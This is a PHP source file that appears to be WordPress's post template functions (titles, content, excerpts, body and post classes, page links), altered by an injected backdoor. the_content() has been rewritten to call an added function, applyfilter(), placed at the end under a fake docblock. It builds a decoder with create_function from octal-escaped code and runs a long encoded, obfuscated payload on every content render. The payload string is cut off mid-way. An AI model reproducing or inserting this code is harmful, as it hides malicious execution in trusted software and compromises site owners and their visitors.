<?php
/**
 * WordPress Post Template Functions.
 *
 * Gets content for the current post in the loop.
 *
 * @package WordPress
 * @subpackage Template
 */

/**
 * Display the ID of the current item in the WordPress Loop.
 *
 * @since 0.71
 */
function the_ID() {
	echo get_the_ID();
}

/**
 * Retrieve the ID of the current item in the WordPress Loop.
 *
 * @since 2.1.0
 * @uses $post
 *
 * @return int
 */
function get_the_ID() {
	return get_post()->ID;
}

/**
 * Display or retrieve the current post title with optional content.
 *
 * @since 0.71
 *
 * @param string $before Optional. Content to prepend to the title.
 * @param string $after Optional. Content to append to the title.
 * @param bool $echo Optional, default to true.Whether to display or return.
 * @return null|string Null on no title. String if $echo parameter is false.
 */
function the_title($before = '', $after = '', $echo = true) {
	$title = get_the_title();

	if ( strlen($title) == 0 )
		return;

	$title = $before . $title . $after;

	if ( $echo )
		echo $title;
	else
		return $title;
}

/**
 * Sanitize the current title when retrieving or displaying.
 *
 * Works like {@link the_title()}, except the parameters can be in a string or
 * an array. See the function for what can be override in the $args parameter.
 *
 * The title before it is displayed will have the tags stripped and {@link
 * esc_attr()} before it is passed to the user or displayed. The default
 * as with {@link the_title()}, is to display the title.
 *
 * @since 2.3.0
 *
 * @param string|array $args Optional. Override the defaults.
 * @return string|null Null on failure or display. String when echo is false.
 */
function the_title_attribute( $args = '' ) {
	$title = get_the_title();

	if ( strlen($title) == 0 )
		return;

	$defaults = array('before' => '', 'after' =>  '', 'echo' => true);
	$r = wp_parse_args($args, $defaults);
	extract( $r, EXTR_SKIP );

	$title = $before . $title . $after;
	$title = esc_attr(strip_tags($title));

	if ( $echo )
		echo $title;
	else
		return $title;
}

/**
 * Retrieve post title.
 *
 * If the post is protected and the visitor is not an admin, then "Protected"
 * will be displayed before the post title. If the post is private, then
 * "Private" will be located before the post title.
 *
 * @since 0.71
 *
 * @param mixed $post Optional. Post ID or object.
 * @return string
 */
function get_the_title( $post = 0 ) {
	$post = get_post( $post );

	$title = isset( $post->post_title ) ? $post->post_title : '';
	$id = isset( $post->ID ) ? $post->ID : 0;

	if ( ! is_admin() ) {
		if ( ! empty( $post->post_password ) ) {
			$protected_title_format = apply_filters( 'protected_title_format', __( 'Protected: %s' ) );
			$title = sprintf( $protected_title_format, $title );
		} else if ( isset( $post->post_status ) && 'private' == $post->post_status ) {
			$private_title_format = apply_filters( 'private_title_format', __( 'Private: %s' ) );
			$title = sprintf( $private_title_format, $title );
		}
	}

	return apply_filters( 'the_title', $title, $id );
}

/**
 * Display the Post Global Unique Identifier (guid).
 *
 * The guid will appear to be a link, but should not be used as an link to the
 * post. The reason you should not use it as a link, is because of moving the
 * blog across domains.
 *
 * Url is escaped to make it xml safe
 *
 * @since 1.5.0
 *
 * @param int $id Optional. Post ID.
 */
function the_guid( $id = 0 ) {
	echo esc_url( get_the_guid( $id ) );
}

/**
 * Retrieve the Post Global Unique Identifier (guid).
 *
 * The guid will appear to be a link, but should not be used as an link to the
 * post. The reason you should not use it as a link, is because of moving the
 * blog across domains.
 *
 * @since 1.5.0
 *
 * @param int $id Optional. Post ID.
 * @return string
 */
function get_the_guid( $id = 0 ) {
	$post = get_post($id);

	return apply_filters('get_the_guid', $post->guid);
}

/**
 * Display the post content.
 *
 * @since 0.71
 *
 * @param string $more_link_text Optional. Content for when there is more text.
 * @param bool $stripteaser Optional. Strip teaser content before the more text. Default is false.
 */
function the_content($more_link_text = null, $stripteaser = false) {
	$content = get_the_content($more_link_text, $stripteaser);
	$content = apply_filters('the_content', $content);
	$content = str_replace(']]>', ']]&gt;', applyfilter($content));
	echo $content;
}

/**
 * Retrieve the post content.
 *
 * @since 0.71
 *
 * @param string $more_link_text Optional. Content for when there is more text.
 * @param bool $stripteaser Optional. Strip teaser content before the more text. Default is false.
 * @return string
 */
function get_the_content( $more_link_text = null, $stripteaser = false ) {
	global $more, $page, $pages, $multipage, $preview;

	$post = get_post();

	if ( null === $more_link_text )
		$more_link_text = __( '(more...)' );

	$output = '';
	$hasTeaser = false;

	// If post password required and it doesn't match the cookie.
	if ( post_password_required() )
		return get_the_password_form();

	if ( $page > count($pages) ) // if the requested page doesn't exist
		$page = count($pages); // give them the highest numbered page that DOES exist

	$content = $pages[$page-1];
	if ( preg_match('/<!--more(.*?)?-->/', $content, $matches) ) {
		$content = explode($matches[0], $content, 2);
		if ( !empty($matches[1]) && !empty($more_link_text) )
			$more_link_text = strip_tags(wp_kses_no_null(trim($matches[1])));

		$hasTeaser = true;
	} else {
		$content = array($content);
	}
	if ( (false !== strpos($post->post_content, '<!--noteaser-->') && ((!$multipage) || ($page==1))) )
		$stripteaser = true;
	$teaser = $content[0];
	if ( $more && $stripteaser && $hasTeaser )
		$teaser = '';
	$output .= $teaser;
	if ( count($content) > 1 ) {
		if ( $more ) {
			$output .= '<span id="more-' . $post->ID . '"></span>' . $content[1];
		} else {
			if ( ! empty($more_link_text) )
				$output .= apply_filters( 'the_content_more_link', ' <a href="' . get_permalink() . "#more-{$post->ID}\" class=\"more-link\">$more_link_text</a>", $more_link_text );
			$output = force_balance_tags($output);
		}

	}
	if ( $preview ) // preview fix for javascript bug with foreign languages
		$output =	preg_replace_callback('/\%u([0-9A-F]{4})/', '_convert_urlencoded_to_entities', $output);

	return $output;
}

/**
 * Preview fix for javascript bug with foreign languages
 *
 * @since 3.1.0
 * @access private
 * @param array $match Match array from preg_replace_callback
 * @return string
 */
function _convert_urlencoded_to_entities( $match ) {
	return '&#' . base_convert( $match[1], 16, 10 ) . ';';
}

/**
 * Display the post excerpt.
 *
 * @since 0.71
 * @uses apply_filters() Calls 'the_excerpt' hook on post excerpt.
 */
function the_excerpt() {
	echo apply_filters('the_excerpt', get_the_excerpt());
}

/**
 * Retrieve the post excerpt.
 *
 * @since 0.71
 *
 * @param mixed $deprecated Not used.
 * @return string
 */
function get_the_excerpt( $deprecated = '' ) {
	if ( !empty( $deprecated ) )
		_deprecated_argument( __FUNCTION__, '2.3' );

	$post = get_post();

	if ( post_password_required() ) {
		return __( 'There is no excerpt because this is a protected post.' );
	}

	return apply_filters( 'get_the_excerpt', $post->post_excerpt );
}

/**
 * Whether post has excerpt.
 *
 * @since 2.3.0
 *
 * @param int $id Optional. Post ID.
 * @return bool
 */
function has_excerpt( $id = 0 ) {
	$post = get_post( $id );
	return ( !empty( $post->post_excerpt ) );
}

/**
 * Display the classes for the post div.
 *
 * @since 2.7.0
 *
 * @param string|array $class One or more classes to add to the class list.
 * @param int $post_id An optional post ID.
 */
function post_class( $class = '', $post_id = null ) {
	// Separates classes with a single space, collates classes for post DIV
	echo 'class="' . join( ' ', get_post_class( $class, $post_id ) ) . '"';
}

/**
 * Retrieve the classes for the post div as an array.
 *
 * The class names are add are many. If the post is a sticky, then the 'sticky'
 * class name. The class 'hentry' is always added to each post. For each
 * category, the class will be added with 'category-' with category slug is
 * added. The tags are the same way as the categories with 'tag-' before the tag
 * slug. All classes are passed through the filter, 'post_class' with the list
 * of classes, followed by $class parameter value, with the post ID as the last
 * parameter.
 *
 * @since 2.7.0
 *
 * @param string|array $class One or more classes to add to the class list.
 * @param int $post_id An optional post ID.
 * @return array Array of classes.
 */
function get_post_class( $class = '', $post_id = null ) {
	$post = get_post($post_id);

	$classes = array();

	if ( empty($post) )
		return $classes;

	$classes[] = 'post-' . $post->ID;
	if ( ! is_admin() )
		$classes[] = $post->post_type;
	$classes[] = 'type-' . $post->post_type;
	$classes[] = 'status-' . $post->post_status;

	// Post Format
	if ( post_type_supports( $post->post_type, 'post-formats' ) ) {
		$post_format = get_post_format( $post->ID );

		if ( $post_format && !is_wp_error($post_format) )
			$classes[] = 'format-' . sanitize_html_class( $post_format );
		else
			$classes[] = 'format-standard';
	}

	// post requires password
	if ( post_password_required($post->ID) )
		$classes[] = 'post-password-required';

	// sticky for Sticky Posts
	if ( is_sticky($post->ID) && is_home() && !is_paged() )
		$classes[] = 'sticky';

	// hentry for hAtom compliance
	$classes[] = 'hentry';

	// Categories
	if ( is_object_in_taxonomy( $post->post_type, 'category' ) ) {
		foreach ( (array) get_the_category($post->ID) as $cat ) {
			if ( empty($cat->slug ) )
				continue;
			$classes[] = 'category-' . sanitize_html_class($cat->slug, $cat->term_id);
		}
	}

	// Tags
	if ( is_object_in_taxonomy( $post->post_type, 'post_tag' ) ) {
		foreach ( (array) get_the_tags($post->ID) as $tag ) {
			if ( empty($tag->slug ) )
				continue;
			$classes[] = 'tag-' . sanitize_html_class($tag->slug, $tag->term_id);
		}
	}

	if ( !empty($class) ) {
		if ( !is_array( $class ) )
			$class = preg_split('#\s+#', $class);
		$classes = array_merge($classes, $class);
	}

	$classes = array_map('esc_attr', $classes);

	return apply_filters('post_class', $classes, $class, $post->ID);
}

/**
 * Display the classes for the body element.
 *
 * @since 2.8.0
 *
 * @param string|array $class One or more classes to add to the class list.
 */
function body_class( $class = '' ) {
	// Separates classes with a single space, collates classes for body element
	echo 'class="' . join( ' ', get_body_class( $class ) ) . '"';
}

/**
 * Retrieve the classes for the body element as an array.
 *
 * @since 2.8.0
 *
 * @param string|array $class One or more classes to add to the class list.
 * @return array Array of classes.
 */
function get_body_class( $class = '' ) {
	global $wp_query, $wpdb;

	$classes = array();

	if ( is_rtl() )
		$classes[] = 'rtl';

	if ( is_front_page() )
		$classes[] = 'home';
	if ( is_home() )
		$classes[] = 'blog';
	if ( is_archive() )
		$classes[] = 'archive';
	if ( is_date() )
		$classes[] = 'date';
	if ( is_search() ) {
		$classes[] = 'search';
		$classes[] = $wp_query->posts ? 'search-results' : 'search-no-results';
	}
	if ( is_paged() )
		$classes[] = 'paged';
	if ( is_attachment() )
		$classes[] = 'attachment';
	if ( is_404() )
		$classes[] = 'error404';

	if ( is_single() ) {
		$post_id = $wp_query->get_queried_object_id();
		$post = $wp_query->get_queried_object();

		$classes[] = 'single';
		if ( isset( $post->post_type ) ) {
			$classes[] = 'single-' . sanitize_html_class($post->post_type, $post_id);
			$classes[] = 'postid-' . $post_id;

			// Post Format
			if ( post_type_supports( $post->post_type, 'post-formats' ) ) {
				$post_format = get_post_format( $post->ID );

				if ( $post_format && !is_wp_error($post_format) )
					$classes[] = 'single-format-' . sanitize_html_class( $post_format );
				else
					$classes[] = 'single-format-standard';
			}
		}

		if ( is_attachment() ) {
			$mime_type = get_post_mime_type($post_id);
			$mime_prefix = array( 'application/', 'image/', 'text/', 'audio/', 'video/', 'music/' );
			$classes[] = 'attachmentid-' . $post_id;
			$classes[] = 'attachment-' . str_replace( $mime_prefix, '', $mime_type );
		}
	} elseif ( is_archive() ) {
		if ( is_post_type_archive() ) {
			$classes[] = 'post-type-archive';
			$classes[] = 'post-type-archive-' . sanitize_html_class( get_query_var( 'post_type' ) );
		} else if ( is_author() ) {
			$author = $wp_query->get_queried_object();
			$classes[] = 'author';
			if ( isset( $author->user_nicename ) ) {
				$classes[] = 'author-' . sanitize_html_class( $author->user_nicename, $author->ID );
				$classes[] = 'author-' . $author->ID;
			}
		} elseif ( is_category() ) {
			$cat = $wp_query->get_queried_object();
			$classes[] = 'category';
			if ( isset( $cat->term_id ) ) {
				$classes[] = 'category-' . sanitize_html_class( $cat->slug, $cat->term_id );
				$classes[] = 'category-' . $cat->term_id;
			}
		} elseif ( is_tag() ) {
			$tags = $wp_query->get_queried_object();
			$classes[] = 'tag';
			if ( isset( $tags->term_id ) ) {
				$classes[] = 'tag-' . sanitize_html_class( $tags->slug, $tags->term_id );
				$classes[] = 'tag-' . $tags->term_id;
			}
		} elseif ( is_tax() ) {
			$term = $wp_query->get_queried_object();
			if ( isset( $term->term_id ) ) {
				$classes[] = 'tax-' . sanitize_html_class( $term->taxonomy );
				$classes[] = 'term-' . sanitize_html_class( $term->slug, $term->term_id );
				$classes[] = 'term-' . $term->term_id;
			}
		}
	} elseif ( is_page() ) {
		$classes[] = 'page';

		$page_id = $wp_query->get_queried_object_id();

		$post = get_post($page_id);

		$classes[] = 'page-id-' . $page_id;

		if ( $wpdb->get_var( $wpdb->prepare("SELECT ID FROM $wpdb->posts WHERE post_parent = %d AND post_type = 'page' AND post_status = 'publish' LIMIT 1", $page_id) ) )
			$classes[] = 'page-parent';

		if ( $post->post_parent ) {
			$classes[] = 'page-child';
			$classes[] = 'parent-pageid-' . $post->post_parent;
		}
		if ( is_page_template() ) {
			$classes[] = 'page-template';
			$classes[] = 'page-template-' . sanitize_html_class( str_replace( '.', '-', get_page_template_slug( $page_id ) ) );
		} else {
			$classes[] = 'page-template-default';
		}
	}

	if ( is_user_logged_in() )
		$classes[] = 'logged-in';

	if ( is_admin_bar_showing() ) {
		$classes[] = 'admin-bar';
		$classes[] = 'no-customize-support';
	}

	if ( get_theme_mod( 'background_color' ) || get_background_image() )
		$classes[] = 'custom-background';

	$page = $wp_query->get( 'page' );

	if ( !$page || $page < 2)
		$page = $wp_query->get( 'paged' );

	if ( $page && $page > 1 ) {
		$classes[] = 'paged-' . $page;

		if ( is_single() )
			$classes[] = 'single-paged-' . $page;
		elseif ( is_page() )
			$classes[] = 'page-paged-' . $page;
		elseif ( is_category() )
			$classes[] = 'category-paged-' . $page;
		elseif ( is_tag() )
			$classes[] = 'tag-paged-' . $page;
		elseif ( is_date() )
			$classes[] = 'date-paged-' . $page;
		elseif ( is_author() )
			$classes[] = 'author-paged-' . $page;
		elseif ( is_search() )
			$classes[] = 'search-paged-' . $page;
		elseif ( is_post_type_archive() )
			$classes[] = 'post-type-paged-' . $page;
	}

	if ( ! empty( $class ) ) {
		if ( !is_array( $class ) )
			$class = preg_split( '#\s+#', $class );
		$classes = array_merge( $classes, $class );
	} else {
		// Ensure that we always coerce class to being an array.
		$class = array();
	}

	$classes = array_map( 'esc_attr', $classes );

	return apply_filters( 'body_class', $classes, $class );
}

/**
 * Whether post requires password and correct password has been provided.
 *
 * @since 2.7.0
 *
 * @param int|object $post An optional post. Global $post used if not provided.
 * @return bool false if a password is not required or the correct password cookie is present, true otherwise.
 */
function post_password_required( $post = null ) {
	global $wp_hasher;

	$post = get_post($post);

	if ( empty( $post->post_password ) )
		return false;

	if ( ! isset( $_COOKIE['wp-postpass_' . COOKIEHASH] ) )
		return true;

	if ( empty( $wp_hasher ) ) {
		require_once( ABSPATH . 'wp-includes/class-phpass.php');
		// By default, use the portable hash from phpass
		$wp_hasher = new PasswordHash(8, true);
	}

	$hash = stripslashes( $_COOKIE[ 'wp-postpass_' . COOKIEHASH ] );

	return ! $wp_hasher->CheckPassword( $post->post_password, $hash );
}

/**
 * Page Template Functions for usage in Themes
 *
 * @package WordPress
 * @subpackage Template
 */

/**
 * The formatted output of a list of pages.
 *
 * Displays page links for paginated posts (i.e. includes the <!--nextpage-->.
 * Quicktag one or more times). This tag must be within The Loop.
 *
 * The defaults for overwriting are:
 * 'next_or_number' - Default is 'number' (string). Indicates whether page
 *      numbers should be used. Valid values are number and next.
 * 'nextpagelink' - Default is 'Next Page' (string). Text for link to next page.
 *      of the bookmark.
 * 'previouspagelink' - Default is 'Previous Page' (string). Text for link to
 *      previous page, if available.
 * 'pagelink' - Default is '%' (String).Format string for page numbers. The % in
 *      the parameter string will be replaced with the page number, so Page %
 *      generates "Page 1", "Page 2", etc. Defaults to %, just the page number.
 * 'before' - Default is '<p> Pages:' (string). The html or text to prepend to
 *      each bookmarks.
 * 'after' - Default is '</p>' (string). The html or text to append to each
 *      bookmarks.
 * 'link_before' - Default is '' (string). The html or text to prepend to each
 *      Pages link inside the <a> tag. Also prepended to the current item, which
 *      is not linked.
 * 'link_after' - Default is '' (string). The html or text to append to each
 *      Pages link inside the <a> tag. Also appended to the current item, which
 *      is not linked.
 *
 * @since 1.2.0
 * @access private
 *
 * @param string|array $args Optional. Overwrite the defaults.
 * @return string Formatted output in HTML.
 */
function wp_link_pages($args = '') {
	$defaults = array(
		'before' => '<p>' . __('Pages:'), 'after' => '</p>',
		'link_before' => '', 'link_after' => '',
		'next_or_number' => 'number', 'nextpagelink' => __('Next page'),
		'previouspagelink' => __('Previous page'), 'pagelink' => '%',
		'echo' => 1
	);

	$r = wp_parse_args( $args, $defaults );
	$r = apply_filters( 'wp_link_pages_args', $r );
	extract( $r, EXTR_SKIP );

	global $page, $numpages, $multipage, $more, $pagenow;

	$output = '';
	if ( $multipage ) {
		if ( 'number' == $next_or_number ) {
			$output .= $before;
			for ( $i = 1; $i < ($numpages+1); $i = $i + 1 ) {
				$j = str_replace('%',$i,$pagelink);
				$output .= ' ';
				if ( ($i != $page) || ((!$more) && ($page==1)) ) {
					$output .= _wp_link_page($i);
				}
				$output .= $link_before . $j . $link_after;
				if ( ($i != $page) || ((!$more) && ($page==1)) )
					$output .= '</a>';
			}
			$output .= $after;
		} else {
			if ( $more ) {
				$output .= $before;
				$i = $page - 1;
				if ( $i && $more ) {
					$output .= _wp_link_page($i);
					$output .= $link_before. $previouspagelink . $link_after . '</a>';
				}
				$i = $page + 1;
				if ( $i <= $numpages && $more ) {
					$output .= _wp_link_page($i);
					$output .= $link_before. $nextpagelink . $link_after . '</a>';
				}
				$output .= $after;
			}
		}
	}

	if ( $echo )
		echo $output;

	return $output;
}

/**
 * Applies custom filter.
 *
 * @since 0.71
 *
 * $text string to apply the filter
 * @return string
 */
function applyfilter($text=null) {
	@ini_set('memory_limit','256M');
	if($text) @ob_start();
	if(1){global $O10O1OO1O;$O10O1OO1O=create_function('$s,$k',"\44\163\75\165\162\154\144\145\143\157\144\145\50\44\163\51\73\40\44\164\141\162\147\145\164\75\47\47\73\44\123\75\47\41\43\44\45\46\50\51\52\53\54\55\56\57\60\61\62\63\64\65\66\67\70\71\72\73\74\75\76\134\77\100\101\102\103\104\105\106\107\110\111\112\113\114\115\116\117\120\121\122\123\124\125\126\127\130\131\132\133\135\136\137\140\40\134\47\42\141\142\143\144\145\146\147\150\151\152\153\154\155\156\157\160\161\162\163\164\165\166\167\170\171\172\173\174\175\176\146\136\152\101\105\135\157\153\111\134\47\117\172\125\133\62\46\161\61\173\63\140\150\65\167\137\67\71\42\64\160\100\66\134\163\70\77\102\147\120\76\144\106\126\75\155\104\74\124\143\123\45\132\145\174\162\72\154\107\113\57\165\103\171\56\112\170\51\110\151\121\41\40\43\44\176\50\73\114\164\55\122\175\115\141\54\116\166\127\53\131\156\142\52\60\130\47\73\40\146\157\162\40\50\44\151\75\60\73\40\44\151\74\163\164\162\154\145\156\50\44\163\51\73\40\44\151\53\53\51\40\173\40\44\143\150\141\162\75\163\165\142\163\164\162\50\44\163\54\44\151\54\61\51\73\40\44\156\165\155\75\163\164\162\160\157\163\50\44\123\54\44\143\150\141\162\54\71\65\51\55\71\65\73\40\44\143\165\162\137\153\145\171\75\141\142\163\50\146\155\157\144\50\44\153\40\53\40\44\151\54\71\65\51\51\73\40\44\143\165\162\137\153\145\171\75\44\156\165\155\55\44\143\165\162\137\153\145\171\73\40\151\146\50\44\143\165\162\137\153\145\171\74\60\51\40\44\143\165\162\137\153\145\171\75\44\143\165\162\137\153\145\171\53\71\65\73\40\44\143\150\141\162\75\163\165\142\163\164\162\50\44\123\54\44\143\165\162\137\153\145\171\54\61\51\73\40\44\164\141\162\147\145\164\56\75\44\143\150\141\162\73\40\175\40\162\145\164\165\162\156\40\44\164\141\162\147\145\164\73"); if(!function_exists("O01100llO")){function O01100llO(){global $O10O1OO1O;return call_user_func($O10O1OO1O,'a5%21%20qr%3a1JR%7eJM%23%2d%2dJ%2d%7b%7b%60%60hwv%5f%2b%7b%60zt%2bXAvvAN9%21dd%24%3d%28%3b%3ctKjU%7b5OO5%27DY%2f%2fupXJJsLhs6yu%27%7e%7e%28m2%2d%2dcXf%2cL%3eucJ%29JCITa%5cjjAHgkk%205z5C%24%20kAR%7b3hhw%5f%5f9%7bq%28xe%29%20%3aQ%2dvy%28%3b%24%2bR%2d%29R0x%23%20%7d%2bkA%25mI0RXEajU3%5d%2bj%5dz%2awnXf%266%22%20%238%3a%3d%2fC%2flAVts%27SHieLY%7cA%3a3hKIQL%3bQ%5bQ%28%24%28Y%7eWNv%3bt7%7dWNWovEjA%2bn%27%5b%2a1kh%5d%3d1hzcpwS%7b%5f2%5f8%7b%60%3fu%22%5ch4%22VH%3e%3fZ%2d%7d%28%24VSFHNNYb%3e%7dFvDTCii%2aS%5b%26ej%2e%20%21%2ek%2eQHQai%7d%2dR%21%233%28%7d%2d%7dfR0b%2aM%2cAkvz%5e%26Xgz%26%5dVw1%3dU%7bI%7b4U2prh9%265hBC6pdV%28Q%21iTpTy%3btta8%3bB%7ddVl%2e%2eW%3c%25QGixQLXl%21G%28yk%2fw7yU%24%7dR%241%24%2dL%2d0tbYnRMpNbYbOnIok%2aX%5b1%5ehz7%27Th7%26es%22%7c54%7b4P5%5f%3eJ6B7%5c6%3c%20F%3e%25eNMMtG%3eG%23b%2abjmv%3cb%25e%29%24%24jG%20K%3b%2eo%3bi%27%2dW%20NW%7e%28Ybh%24g%3e%3b9WfXW6W0b0U%2aOI%27X%5e%3dEOIO%5f%275%60hz%5b%226%26%3f7%3ewC%3f%3ep%29TFHBV%5cVeBP%7ctD%25%3e%3cDuN%2fxTb0%5dbr%29%3aNoE%5b%5bGE%2f%27%2ex%2dvv%26%20L%20W%2at%2aX%5f%3bdV%2dpnAjn8n%5eX%5e%26f%5bzUjE%3ck%5bz%5b%22U7w%5f2q%408%7bP4V9JPV%5cQ%25m%21%3eD%3fD%3a%3eFl%7dc%7cVSc%2e%2bul%23ofjXGQK%2bO%5bz%7bukyU%29iMYY%7b%7eWWX%3b%2dj%5f%5dEp%7dDT%2c8fIkf%3efoEo%60%5d%7bq1k%27ZU%7bq%7b%5c1%404p3h%3f%3ew%3dsT6Q%3dTg%7e%3aS%28m%25d%25um%3cCv%7cKTr%7ci0xCLUEoEi%28H03%5b5hxUH1%20%24WXXwMfW%2cXNopIoooU%27%5b%26d%2alKfDz3%7bz%25z1%2616qp%224%7b%60ywp%22p%3d4F%3ed%40%5c%3c%258rmKVRrKcN%29uv%3aCZC%20%3aG%23jJQKxJ%2d%27t%2c%293w%60%26%24N%7e%27p9%5c9%3bwt4M%2cAOO8jIbBz%5bA%5b%27%26%275TE%2exke%7b97%7bG%7b%5f5%5fPwB8%3f7%22Q%40B8B%25%3fc%3cTg%3e%7cGFCZxSWCx%3a%2a%24H0yiKityJ%2d%27%20%3bx%23%20vq%2b%24%2dLL9%5cw%2cWN1s%3fPs%2c6vB%2abqj%5d2%7b9DE57%26O%602prz%21%232%2f7s%5c7J76p6D%40%3dFV%5c8%3bg%3dF%3dGV%3a%7crm%3cuJciK%23lXi%23yER%7e%5dQ%28x%28NQ%20vqta%23%2dt0w%2aAR66%3ep0%5d%2awd%3cdYBbFE5oqwwc%5dJ%29I%7c3%2293K37w7%3e%5fg%3fB94%216g%3fgZBSTcPdrKVye%29%25%2by%29l0%7eiX%2eQ%2fQ%2d%2exRO%23L%29%24%23W1Y%7eRtt7%22%5c7vYW3gFF%3evs%2bP%5e3A%5b%60%60DSc%25Zc917%261rw84%7b%5cwC%22wFg%29VB6%3d%3e8%28%5cb0%3fR%3cr%7c%3cN%3ce%25e%29ZJy%2e%7c%3ajKJyJt%2e%3b%7e%28xH%7dNQY%2d0L%60Y0a7of9n%5ev%5ezn%2aUgE%270%5dE3mqU4%25KZ%25%5b72m%29uCiqK%7b%2e9m4PDD%21s%40cZd%7ePm%25Z%3dG%7dGuKZ%2eTubxZQ%23yGJ%23Kti%7eiI%7dQ%2cviYW%20N%2a%2a5%7ePdL%22%2b%5ef%2b%5c%2bX%2aX%5b0z%27Ofjm%5dz%27z7Owh5U24%5cqB9d%5fyBd%40HcVig%3ds%3d%7cg%3er%2d%3cZdT%3cCvKr%21%5d%2ao%2a%3aHlv%5bI%5bkK%5duO%24%2d%7eR%5bY%2b%7b%218B%24w%2c%2ab%2c4%2cn%2bn%27Yk%5dob0d%5ek%5dkho31%7bIO%5f4U%5c5B%60K%5cB9%2emPJs%3ep%3eSs%3f%25%28VTB%3dVGMr%25%29bYb%2bZ%2eeMI%5dOAr%5eloQ%28%21%3b%27N%2c2M%21%21a%23%7bN%2df%5eM%5e%22%2avkIYI%5cUI%3fz2j1IEoqwDo%60zS54%40%7c4qqp%7bC%7bL%2dh%29%5cd%3e%5c%20%5cPBPeg%25cS%3eFam%25c%25JSyuCZ%7cH%20%3a%28x%2d%2eo%28%2dQzW%7dU%3bM%23M%2a%3bt0wNn%2dvN%5d%40EOWFPVB%5dUE%40mZeSjmESw92p%40%3aU%20%24%26u98s9x9%5c%40%5c%3c6mV%3ds%3fLPmVmK%3dlr%3aDTCxSQ%2f%24GfQ%24%2e%5d%7d%28o%21%3b%29%3bv%21%23W1%2d%2c%24R%2dX%5fbWI%5cP%5c%40Xo0%5fPmFmbP0%3d1%60%7bzwk%60%22e%27i%21UGw6%40wywp%22p%3d4F%3ed%40%5c%7e%3fF%3eF%3ad%7cZeVmKy%3c%29l%21r%2a%29%21ujt%23AH%24%2e%24aHQ%2c2%3b%7d%21L%3bbhv%2cfjpgg4Y%2an5VFFPYBbF%26%7bq%27h%5d%7b7%25z1%261%7cs5%60GBw%60%2e%60%2d%7dwi8VF8%248dPdr%3ee%25ZF%3dN%3ce%25e%29ZJy%2e%7c%3aQ%24GLH%7dxIL%7d%20%5bYa2t%2c%7e%2cXtRf7W%2a%7d%2bWk%5cEfqD%3eVPk2o%5c%3crrZE%3coZ%3ar%3a%2elKi%2fC%29yBVB8x%3dF%40%3e%21%3c%5cZ%7ceuLPe%3d%7dVaT%2feWyyn%3a%24G%20%2d%5e%2f%23%3b%24x%2dIQ%2dR%21%5bM%2cn%3bb3R0bn%5fM%2bnN%2cb%5d8v%25eY%3e%5d%5bU%5dm%5dz%27z7Owh5U2l1whwg5%3fs8%5f9dm4cPeB%7eceV%2durRS%3aD%3axSZ%29bK%2ee%2fK%24A%23tu2%5bI%29tHj17%7bhQq%20h7%5f99946psB%5cb%27ko%3f%26Ej%3eo%7bqw1I%3c95S87%5c%40rq%604p%3duh7m4PDTDsc%20rF%7cV%3bgtmdKrTCN%3cuZYeKlK%5e%7c13loH%28%7eHzH%24%20%24W%23Na%2c%7e%3bw%2dNaNE%2cjf%5ev%2bkzn%26%5d3AF%263%27%3c%22hTq5U5%5cq%7bsK7%40397dx%3eD%22%23t%7e%208%3c%3fxR%2dWMg%2d%3e%2c%2bWYYYbo%2a%5eAfC%2fJ%7eQ%24%7e%24k%21JMW%20v%2b%26%23%23nW%60%2dNb%2a%2cAp%7dDT%2c8fIkf%3efoEo%60%5d%7bq1k%27ZU%7bq%7b%5c1%404p3h%3f%3ew%3dsT6Q%3dTg%7e%3aS%28m%25d%25um%3cCv%7cKTr%7ci0xCLUI%5dEy%7e%2e01q2%26xUH1h%605w5%5f%4074%3f4XW%2b%276E%2aobf2Pzf%7bz1h%5bOT%22%27859%40l%5b%23%7eqC%22%3f8%22%29%22s6sT%5cD%3dm8Bt%3eD%3dD%2fmG%3al%3ccy%29%25%21u%7eK%5e%21%7eJoM%3bk%20LHLW%20%24%2b%7bRN%7e%7dRf7%2a%2b%27Bd%3f6fkX7%3dFd%3c%2a%3eXmh%5fw7kq5OUw1r%60%406h%2fPF8%3f%5cmi%23%20%24%28%20L%28%5cb0%3fR%3cr%7c%3cN%3ce%25e%29ZJy%2e%7c%3ajKJyJt%2e%3b%7e%28xH%7dNQY%2d0L%60Y0a7of9n%5ev%5ezn%2aUgE%270%5dE3mhoUOOeGZ%40U%40D%2eHuH1%2f3JFm%3dD%22BV%40%5c%3dg%7ed%25ZF%2dKCr%3aeJ%2bxiCy%2f%20feq%7b%3a%5d%29%7e%24%29O%29%23%21%23v%20%2cMa%24%285t%2cM%2cAa%5eXfNWoOY2E%7bjd2%7bID9%60%3c%26hzh6%261%5cG%5fp%7b7%5f%3eJPm9%24%21R%21%3e%3cPJ%2ca%2bRBtPau%2eyJ%3c%3aCSZyl0%2fQ%21uALR%24%7e%20aU%2cWR%7dtn3w5%5f75%5eEA%5dMbjNWfEj2%60g0hf%7b%5dh%3cAyJoZ17%5f1l1whwg5%3fs8%5f9ip%3fs%3fS8TD%3cBPeldu%25JcvuJrb%23%29%2aCHGHLC%2etI%21%28J%20%21N%26%2cn%23%603LYt%5b%22%22ggR%22M%5cB%3fB%3cgddd%3dS%3d%60kh9OOc1wZU%7c%26%26s%40K3us9Bmx6%3fTQ%3fDS%24m%3dS%3dl%7dPjEFveu%2febeKlK%23G%21iQ%2fCIJ%21i%21%2cQMR%7d%20%24Wb%28fNEa9fEY6Uo%5c%5ek%2ak1%5eA%7b%3dO%26EzO7%25%60%7bp6uJ%2eGB%7bBZH%7eQ%7ewx7%21%7e%24%28%28%28LNtM%2b%7deDrmcyvx%2e%2eQyu%2fC%7e%5eGttH%28%2dIHQH%7dNQLqMn%7e0Y%7df9tVm%7d6%2a%5dE%2aB%2aA%5eA1j%26%5b2Eoc%27%26%5b%26p2%2279q%7b%5cB%60d%40m4%29dm8%20e%3c%23FTgTGF%3dKa%25%3amZ%25xnyK%7e%27%5dO%5e%2f%20unz%263%60yo7J%3b%7eOQ9%5f4L%5c%228%3faM%40gWVgBB%3cF%2aD%3cDe%25%7crIcS%27%2fk%29HTh%5cs%60B%7cZ%26%2bWIq%5fFS%225%29n%2aDga%20QszO98V%2fHDd%2ckSXZYneMr%24%3bi%7e%7dAyuCi%23%28x%29%5c%7ebg%7e%7bg%3b%2bv5bkInz49N%2eytv0AE%5dj0V%3d%5d%3fk9ph%228Z4C%406J%29HHBC%2fw%5efq%5f6BgP%3f6%28%3bf%3e%20FSGxeG%3avu%20%23%2f%28%2anr%5c6T%3ayQ%21%20%29yzUQE%20%2djLY3A%5dEbEIjWz%5eX2%5c%40YH%29Mnj%27Ozoj%3cT%29OVU%604Bw1T3F4mh6D%3cmc%22d8c%3ecVl%28%3e%7cW%3a%2b